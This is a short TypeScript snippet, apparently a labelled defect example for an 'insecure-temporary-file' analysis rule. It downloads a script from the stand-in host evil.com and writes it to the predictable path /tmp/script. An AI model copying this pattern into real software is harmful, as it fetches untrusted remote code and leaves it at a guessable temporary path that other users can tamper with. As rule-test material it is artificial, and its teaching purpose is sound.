//{fact rule=insecure-temporary-file@v1.0 defects=1}

var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', (res: { on: (arg0: string, arg1: (d: any) => void) => void; }) => {
  res.on("data", (d: any) => {
    fs.writeFileSync("/tmp/script", d)
  })
});


//{/fact}
